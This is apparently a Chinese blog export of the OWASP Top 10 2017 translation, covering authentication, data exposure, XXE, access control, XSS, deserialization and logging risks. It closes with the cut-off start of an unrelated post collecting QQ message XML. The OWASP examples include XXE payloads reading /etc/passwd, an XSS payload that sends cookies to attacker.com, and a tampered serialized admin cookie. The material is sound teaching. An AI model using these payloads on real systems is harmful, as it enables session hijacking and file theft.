<p>场景#2：<br>大多数身份验证攻击都是由于使用密码作为唯一的因素。依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重用以及重用弱密码。建议组织NIST-800-63中停止这些实践，并使用多因素身份验证。</p>
<p>场景#3：<br>应用会话超时设置不正确。用户使用公共计算机访问应用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户状态仍然是经过身份验证的。</p>
<p>如何防止?<br>在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</p>
<p>不要使用发送或部署默认的凭证，特别是管理员用户。<br>执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。<br>将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的记住秘密，或其他现代的基于证据的密码策略相一致。<br>确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。<br>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。<br>使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</p>
<h3 id="A3-2017-敏感数据泄露"><a href="#A3-2017-敏感数据泄露" class="headerlink" title="A3:2017-敏感数据泄露"></a>A3:2017-敏感数据泄露</h3><p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
<p>知识点简介<br>首先你需要确认的是哪些数据是敏感数据（包含：传输过程中的数据、存储数据）而需要被加密。例如：密码、信用卡卡号、医疗记录、个人信息应该被加密，特别是隐私法律或条例中规定需要加密的数据，如：欧盟《通用数据保护条例》（GDPR）、 属于“金融数据保护条例”的《支付卡行业数据安全标准》（PICDSS）。对于这些数据，要确定：</p>
<p>在数据传输过程中是否使用明文传输? 这和传输协议相关，如：HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、Web服务器或后端系统之间的通信。<br>当数据被长期存储时，无论存储在哪里，它们是否都被加密，包含备份数据?<br>无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法?<br>是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转?<br>是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密?<br>用户代理（如：应用程序、邮件客户端）是否未验证服务器端证书的有效性?<br>案例场景<br>场景 #1：<br>一个应用程序使用自动化的数据加密系统加密信用卡信息，并存储在数据库中。但是，当数据被检索时被自动解密，这就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。</p>
<p>场景 #2：<br>一个网站上对所有网页没有使用或强制使用TLS，或者使用弱加密。攻击者通过监测网络流量（如：不安全的无线网络），将网络连接从HTTPS降级到HTTP，就可以截取请求并窃取用户会话cookie。 之后，攻击者可以复制用户cookie并成功劫持经过认证的用户会话、访问或修改用户个人信息。除此之外，攻击者还可以更改所有传输过程中的数据，例如：转款的接接收者。</p>
<p>场景 #3：<br>密码数据库使用未加盐的哈希算法或弱哈希算法去存储每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。 由简单或快速散列函数生成加盐的哈希，也可以通过GPU破解。</p>
<p>如何防止?<br>对一些需要加密的敏感数据，应该起码做到以下几点：</p>
<p>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。<br>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。<br>对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过PCI DSS标记或拦截。未存储的数据不能被窃取。<br>确保存储的所有敏感数据被加密。<br>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且密钥管理到位。<br>确保传输过程中的数据被加密，如：使用TLC。确保数据加密被强制执行，如：使用HTTP严格安全传输协议（HSTS ）。<br>禁止缓存对包含敏感数据的响应。<br>确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受范围。<br>单独验证每个安全配置项的有效性。</p>
<h3 id="A4-2017-XML-外部实体（XXE）"><a href="#A4-2017-XML-外部实体（XXE）" class="headerlink" title="A4:2017-XML 外部实体（XXE）"></a>A4:2017-XML 外部实体（XXE）</h3><p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
<p>知识点简介<br>应用程序和特别是基于XML的Web服务或向下集成，可能在以下方面容易受到攻击：</p>
<p>您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。<br>在应用程序或基于Web服务的SOAP中，所有XML处理器都启用了文档类型定义（DTDs）。因为禁用DTD进程的确切机制因处理器而不同，更多资料请参考：《 OWASP Cheat Sheet ‘XXE Prevention‘ 》。<br>如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。<br>如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。<br>存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括：Billion Laughs 攻击。<br>案例场景<br>大量XXE缺陷已经被发现并被公开，这些缺陷包括嵌入式设备的XXE缺陷。 XXE缺陷存在于许多意想不到的地方，这些地方包括深嵌套的依赖项。最简单的方法是上传可被接受的恶意XML文件：</p>
<p>场景 #1：攻击者尝试从服务端提取数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
<p>场景 #2：攻击者通过将上面的实体行更改为以下内容来探测服务器的专用网络：<br><code>&lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;</code><br>场景 #3：攻击者通过恶意文件执行拒绝服务攻击：<br><code>&lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code><br>如何防止?<br>开发人员培训是识别和减少XXE缺陷的关键，此外，防止XXE 缺陷还需要：</p>
<p>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。<br>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。<br>参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。<br>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。<br>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。<br>尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。如果无法实现这些控制，请考虑使用虚拟修复程序、API安全网关或Web应用程序防火墙（ WAF ）来检测、监控和防止XXE攻<br>击。</p>
<h3 id="A5-2017-失效的访问控制"><a href="#A5-2017-失效的访问控制" class="headerlink" title="A5:2017-失效的访问控制"></a>A5:2017-失效的访问控制</h3><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
<p>知识点简介<br>访问控制强制实施策略，使用户无法在其预期的权限之外执行行为。失败的访问控制通常导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。常见的访问控制脆弱点包括：</p>
<p>通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具。<br>允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。<br>特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。<br>元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权限的cookie 或隐藏字段。<br>CORS配置错误允许未授权的API访问。<br>以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面、或作为标准用户访问具有相关权限的页面、或API没有对POST、PUT和DELETE强制执行访问控制。<br>案例场景<br>场景 #1：应用程序在访问帐户信息的 SQL调用中使用了未经验证的数据：<br>pstmt.setString(1，request.getParameter(“acct”));<br>ResultSet results = pstmt.executeQuery( );<br>攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何帐号信息。如果没有正确验证，攻击者可以访问任何用户的帐户。</p>
<p><a href="http://example.com/app/accountInfo?acct=notmyacct" target="_blank" rel="noopener">http://example.com/app/accountInfo?acct=notmyacct</a><br>场景 #2：攻击者仅强制浏览目标URL。管理员权限是访问管理页面所必需的。<br><a href="http://example.com/app/getappInfo" target="_blank" rel="noopener">http://example.com/app/getappInfo</a><br><a href="http://example.com/app/admin_getappInfo" target="_blank" rel="noopener">http://example.com/app/admin_getappInfo</a><br>如果一个未经身份验证的用户可以访问任何页面，那么这是一个缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这同样也是一个缺陷。</p>
<p>如何防止?<br>访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。</p>
<p>除公有资源外，默认情况下拒绝访问。<br>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化CORS使用。<br>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。<br>域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。<br>禁用 Web服务器目录列表，并确保文件元数据（如：git）不存在于 Web的根目录中。<br>记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。<br>对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。<br>当用户注销后，服务器上的JWT令牌应失效。<br>开发人员和 QA人员应包括功能访问控制单元和集成测试人员。</p>
<h3 id="A6-2017-–-安全配置错误"><a href="#A6-2017-–-安全配置错误" class="headerlink" title="A6:2017 – 安全配置错误"></a>A6:2017 – 安全配置错误</h3><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
<p>知识点简介<br>您的应用程序可能受到攻击，如果应用程序是：</p>
<p>应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。<br>应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。<br>默认帐户的密码仍然可用且没有更改。<br>错误处理机制向用户披露堆栈跟踪或其他大量错误信息。<br>对于更新的系统，禁用或不安全地配置最新的安全功能。<br>应用程序服务器、应用程序框架（如：Struts、Spring、ASP.NET）、库文件、数据库等没有进行安全配置。<br>服务器不发送安全标头或指令，或者未对服务器进行安全配置。<br>您的应用软件已过期或易受攻击（参见A9：2017-使用含有已知漏洞的组件）。<br>缺少一个体系的、可重复的应用程序安全配置过程，系统将处于高风险中。</p>
<p>案例场景<br>场景#1：<br>应用程序服务器附带了未从产品服务器中删除的应用程序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这些漏洞来攻击服务器。如果其中一个应用程序是管理员控制台，并且没有更改默认账户，攻击者就可以通过默认密码登录，从而接管服务器。</p>
<p>场景#2：<br>目录列表在服务器端未被禁用。攻击者发现他们很容易就能列出目录列表。攻击者找到并下载所有已编译的Java类，他们通过反编译来查看代码。然后，攻击者在应用程序中找到一个严重的访问控制漏洞。</p>
<p>场景#3：<br>应用服务器配置允许将详细的错误信（如：堆栈跟踪信息）返回给用户，这可能会暴露敏感信息或潜在的漏洞，如：已知含有漏洞的组件的版本信息。</p>
<p>场景#4：<br>云服务向其他CSP用户提供默认的网络共享权限。这允许攻击者访问存储在云端的敏感数据。</p>
<p>如何防止?<br>应实施安全的安装过程，包括：</p>
<p>一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。<br>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架。<br>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，（参见A9：2017-使用含有已知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：S3桶权限）。<br>一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。<br>向客户端发送安全指令，如：安全标头。<br>在所有环境中能够进行正确安全配置和设置的自动化过程。</p>
<h3 id="A7-2017-–-跨站脚本（XSS）"><a href="#A7-2017-–-跨站脚本（XSS）" class="headerlink" title="A7:2017 – 跨站脚本（XSS）"></a>A7:2017 – 跨站脚本（XSS）</h3><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
<p>知识点简介<br>存在三种XSS类型，通常针对用户的浏览器：</p>
<p>反射式XSS：应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。</p>
<p>存储式XSS：你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。</p>
<p>基于DOM的XSS：会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的JavaScriptAPI。</p>
<p>典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户侧的攻击。</p>
<p>案例场景<br>场景#1：应用程序在下面HTML代码段的构造中使用未经验证或转义的不可信的数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(String) page +&#x3D; &quot;&lt;input name&#x3D;&#39;creditcard&#39; type&#x3D;&#39;TEXT‘</span><br><span class="line">value&#x3D;&#39;&quot; + request.getParameter(&quot;CC“) + &quot;&#39;&gt;&quot;;</span><br></pre></td></tr></table></figure>
<p>攻击者在浏览器中修改“CC” 参数为如下值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&gt;&lt;script&gt;document.location&#x3D;&#39;http:&#x2F;&#x2F;www.attacker.com&#x2F;cgi-bin&#x2F;cookie.cgi?foo&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;&#39;.</span><br></pre></td></tr></table></figure>
<p>这个攻击导致受害者的会话ID被发送到攻击者的网站，使得攻击者能够劫持用户当前会话。</p>
<p>注意：攻击者同样能使用跨站脚本攻破应用程序可能使用的任何跨站请求伪造（CSRF）防御机制。CSRF的详细情况见2013年版中的A8项。</p>
<p>如何防止?<br>防止XSS需要将不可信数据与动态的浏览器内容区分开。这可以通过如下步骤实现：</p>
<p>使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0或 React JS。了解每个框架的XSS保护的局限性，并适当地处理未覆盖的用例。<br>为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》。<br>在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》描述的类似上下文敏感的转义技术应用于浏览器API。<br>使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。</p>
<h3 id="A8-2017-–-不安全的反序列化"><a href="#A8-2017-–-不安全的反序列化" class="headerlink" title="A8:2017 – 不安全的反序列化"></a>A8:2017 – 不安全的反序列化</h3><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
<p>知识点简介<br>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。这可能导致两种主要类型的攻击：</p>
<p>如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。<br>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。<br>在应用程序中，序列化可能被用于:</p>
<p>远程和进程间通信（RPC / IPC）<br>连线协议、Web服务、消息代理<br>缓存/持久性<br>数据库、缓存服务器、文件系统<br>HTTP cookie、HTML表单参数、API身份验证令牌<br>案例场景<br>场景 #1：<br>一个React应用程序调用了一组Spring Boot微服务。作为功能性程序员，他们试图确保他们的代码是不可变的。他们提出的解决方法是序列化用户状态，并在每次请求时来回传递。攻击者注意到了“R00”Java对象签名，并使用Java Serial Killer工具在应用服务器上获得远程代码执行。</p>
<p>场景 #2：<br>一个PHP论坛使用PHP对象序列化来保存一个“超级”cookie。该cookie包含了用户的用户ID、角色、密码哈希和其他状态：</p>
<p>a:4:{i:0;i:132;i:1;s:7:”Mallory”;i:2;s:4:”user”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<br>攻击者更改序列化对象以授予自己为admin权限：</p>
<p>a:4:{i:0;i:1;i:1;s:5:”Alice”;i:2;s:5:”admin”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<br>如何防止?<br>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。如果上述不可能的话，考虑使用下述方法：</p>
<p>执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。<br>在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。<br>如果可能，隔离运行那些在低特权环境中反序列化的代码。<br>记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。<br>限制或监视来自于容器或服务器传入和传出的反序列化网络连接。<br>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</p>
<h3 id="A9-2017-–使用含有已知漏洞的组件"><a href="#A9-2017-–使用含有已知漏洞的组件" class="headerlink" title="A9:2017 –使用含有已知漏洞的组件"></a>A9:2017 –使用含有已知漏洞的组件</h3><p>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
<p>知识点简介<br>如果满足下面的某个条件，那么你的应用就易受此类攻击：</p>
<p>如果你不知道所有使用的组件版本信息（包括：服务端和客户端）。这包括了直接使用的组件或其依赖的组件。<br>如果软件易受攻击，不再支持或者过时。这包括：OS、Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。<br>如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。<br>如果你不基于风险并及时修复或升级底层平台、框架和依赖库。很可能发生这种情况：根据变更控制，每月或每季度进行升级，这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。<br>如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。<br>如果你没有对组件进行安全配置（请参考“A6:2017-安全配置错误”）。<br>案例场景<br>场景 #1：<br>很多时候组件都是以与应用相同的权限运行的，这使得组件里的缺陷可能导致各式各样的问题。这些缺陷可能是偶然的（如：编码错误），也可能是蓄意的（如：组件里的后门）。下面是一些已被利用的漏洞：</p>
<p>CVE-2017-5638，一个Struts2远程执行漏洞。 可在服务端远程执行代码，并已造成巨大的影响。<br>虽然物联网（IoT）设备一般难以通过打补丁来修复。但对之打补丁非常重要（如：医疗设备）。<br>有些自动化工具能帮助攻击者发现未打补丁的或配置不正确的系统。例如 ：Shodan IOT搜索引擎能帮助你发现从2014年四月至今仍存在心脏出血漏洞的设备。</p>
<p>如何防止?<br>应该制定一个补丁管理流程：</p>
<p>移除不使用的依赖、不需要的功能、组件、文件和文档。<br>利用如 versions、DependencyCheck 、retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息。持续监控如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警告邮件。<br>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险<br>监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置。</p>
<h3 id="A10-2017-–-不足的日志记录和监控"><a href="#A10-2017-–-不足的日志记录和监控" class="headerlink" title="A10:2017 – 不足的日志记录和监控"></a>A10:2017 – 不足的日志记录和监控</h3><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
<p>知识点简介<br>下列情况会导致不足的日志记录、检测、监控和响应：</p>
<p>未记录可审计性事件，如：登录、登录失败和高额交易。<br>告警和错误事件未能产生或产生不足的和不清晰的日志信息。<br>没有利用应用系统和API的日志信息来监控可疑活动。<br>日志信息仅在本地存储。<br>没有定义合理的告警阈值和制定响应处理流程。<br>渗透测试和使用DAST工具（如：OWASP ZAP）扫描没有触发告警<br>对于实时或准实时的攻击，应用程序无法检测、处理和告警。如果你的应用使得日志信息或告警信息对用户或者攻击者可见，你就很容易遭受信息泄露攻击（请参考A3：2017-敏感信息泄露）<br>案例场景<br>场景#1：<br>一个由小团队运营的开源项目论坛软件被攻击者利用其内在漏洞攻陷了。 攻击者设法删除了包含下一个版本的内部源代码仓库以及所有论坛内容。 虽然代码可以恢复，但由于缺乏监控、日志记录和告警导致了更糟糕的结果。 由于此问题，该论坛软件项目不再活跃。</p>
<p>场景#2：<br>攻击者使用通用密码进行用户扫描并能获取所有使用此密码的账户。对于其他账户而言，将仅有一次失败的登陆尝试记录。一段时间以后，攻击者可以用另一个密码再次进行此活动。</p>
<p>场景#3：<br>美国的一家大型零售商据内部使用恶意软件分析沙箱做分析。 沙箱软件检测到了一些可能不需要的软件，但没有人响应此次检测。 在一个境外银行不正当的信用卡交易被检测到之前，该沙箱软件一直在产生告警信息。</p>
<p>如何防止?<br>根据应用程序存储或处理的数据的风险：:</p>
<p>确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。<br>确保日志以一种能被集中日志管理解决方案使用的形式生成<br>确保高额交易有完整性控制的审计信息，以防止篡改或删除，例如审计信息保存在只能进行记录增加的数据库表中。<br>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。<br>建立或采取一个应急响应机制和恢复计划，例如：NIST 800-61 rev 2或更新版本。<br>目前已有商业的和开源的应用程序防护框架（例如：OWASP AppSensor）、Web应用防火墙（例如 ：Modsecurity with theOWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志关联软件。</p>
<h3 id="开发人员下一步做什么"><a href="#开发人员下一步做什么" class="headerlink" title="开发人员下一步做什么?"></a>开发人员下一步做什么?</h3><p>建立并使用可重复使用的安全流程和标准安全控制</p>
<p>无论您是刚接触Web应用程序安全，还是已经非常熟悉各种安全风险，创建一个安全的Web应用程序或修复一个已存在的应用程序的任务都可能很困难。若您需要管理一个大型的应用程序系统群，那任务将十分艰巨。</p>
<p>为帮助企业和开发人员以节省成本的方式降低应用程序的安全风险，OWASP创建了相当多的免费和开源的资源。您可以使用这些资源来解决您企业组织的应用程序安全问题。以下内容是OWASP为帮助企业组织创建安全的Web应用程序和API提供的一些资源。在下一页中，我们将展示其它可以帮助企业用于检查Web应用程序和接口安全性的OWASP资源。</p>
<h3 id="安全测试人员下一步做什么"><a href="#安全测试人员下一步做什么" class="headerlink" title="安全测试人员下一步做什么?"></a>安全测试人员下一步做什么?</h3><p>建立持续性的应用安全测试</p>
<p>安全编码很重要。但验证你想达到的安全性是否真实存在、是否正确、是否像我们想的那样也很关键。应用程序安全测试的目标是提供这些证据。这项工作困难而复杂，敏捷和DevOps当前快速发展的过程给传统的方法和工具带来的极大的挑战。因此，我们强烈建议你思考如何专注于整个应用程序组合中重要的地方，并且低成本高收益。</p>
<p>当前安全风险变化很快，每年进行一次的扫描或渗透测试的日子已经过去了。现代软件开发需要在整个软件开发生命周期中进行持续的应用安全测试。通过安全自动化来加强现有的开发管道并不会减缓开发速度。无论你选择哪种方法，都需考虑一下每年随着应用系统的规模倍增的定期测试、修复、复测并重新部署应用程序的成本。</p>
<h3 id="企业组织下一步做什么"><a href="#企业组织下一步做什么" class="headerlink" title="企业组织下一步做什么?"></a>企业组织下一步做什么?</h3><p>现在就启动您的应用程序安全计划</p>
<p>应用程序安全已经不再是一个选择了。在日益增长的攻击和监管的压力下，企业组织必须建立一个有效的能力去确保应用程序和API的安全。由于在生产环境中的应用程序和APIs的代码行数惊人，许多企业组织都在努力处理数量巨大的漏洞。</p>
<p>OWASP建议这些企业组织建立一个应用程序安全计划，深入了解并改善它们的应用程序组合的安全性。为了实现应用程序的安全性，需要企业组织中的不同部门之间有效地协同工作，这包括安全和审计、软件开发、商业和执行管理。安全应该可视化和可量化，让所有不同角色的人都可以看到并理解企业组织的应用程序的安全态势。通过消除或降低风险的方式专注于活动和结果，以帮助提高企业安全性。《OWASP SAMM》和首席信息官的《OWASP应用安全指南》是这个列表中大多数关键活动的来源。</p>
<h3 id="应用程序管理者下一步做什么"><a href="#应用程序管理者下一步做什么" class="headerlink" title="应用程序管理者下一步做什么?"></a>应用程序管理者下一步做什么?</h3><p>管理完整的应用程序生命周期</p>
<p>应用程序是人创建和维护的最复杂的系统之一。应用程序的IT管理应该由IT专家来完成，并且由专家们负责应用程序的整个IT生命周期。</p>
<p>我们建议建立应用程序管理器的角色对等于应用程序所有者。应用程序管理器负责整个应用程序生命周期，从尝尝被忽视的IT角度，这包含收集需求到系统下线的过程。</p>
<h3 id="风险因素总结"><a href="#风险因素总结" class="headerlink" title="风险因素总结"></a>风险因素总结</h3><p>攻击者可以通过应用程序中许多不同的路径方法去危害您的业务或者企业组织。每种路径方法都代表了一种风险，这些风险可能会，也可能不会严重到值得您去关注。</p>
<p>有时，这些路径方法很容易被发现并利用，但有的则非常困难。同样，所造成的危害有可能无关紧要，也可能导致破产。为了确定您企业的风险，可以结合其产生的技术影响和对企业的业务影响，去评估威胁来源、攻击向量和安全漏洞的可能性。总之，这些因素决定了全部的风险。</p>
<p>下面的表格总结了2017年版Top 10应用程序安全风险因素，以及我们赋予每个风险因素的风险值。这些因素基于OWASP团队拥有的统计数据和经验而决定。为了了解某个特定的应用程序或者企业组织的风险，您必须考虑您自己的威胁代理和业务影响。如果没有相应位置上的威胁代理去执行必要的攻击，或者产生的业务影响微不足道，那么就是再严重的软件漏洞也不会导致一个严重的安全风险。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>闲时百度</tag>
      </tags>
  </entry>
  <entry>
    <title>QQ/XML</title>
    <url>/2020/03/19/QQ-XML/</url>
    <content><![CDATA[<p>搜集XML<br><strong><em>*&lt;才发现xml可能是在markdown后也被解析了，这里复制的部分xml到qq上不能用&gt;</em></strong><br><strong><em>*&lt;有时间再想想怎么弄才可以吧，&gt;</em></strong></p>
<a id="more"></a>
<h2 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h2><h3 id="QQ新闻："><a href="#QQ新闻：" class="headerlink" title="QQ新闻："></a>QQ新闻：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes' ?&gt;</span><span class="tag">&lt;<span class="name">msg</span> <span class="attr">serviceID</span>=<span class="string">"0"</span> <span class="attr">templateID</span>=<span class="string">"1"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">brief</span>=<span class="string">"小女孩跟妈妈逛超市发抖尿裤子 背后原因令人愤怒"</span> <span class="attr">sourceMsgId</span>=<span class="string">"0"</span> <span class="attr">url</span>=<span class="string">""</span> <span class="attr">flag</span>=<span class="string">"4"</span> <span class="attr">accostType</span>=<span class="string">"7"</span> <span class="attr">adverSign</span>=<span class="string">"0"</span> <span class="attr">multiMsgFlag</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">item</span> <span class="attr">layout</span>=<span class="string">"5"</span> <span class="attr">action</span>=<span class="string">"web"</span> <span class="attr">url</span>=<span class="string">"https://view.inews.qq.com/q/WXN20200318028391021?refer=mobileqq<span 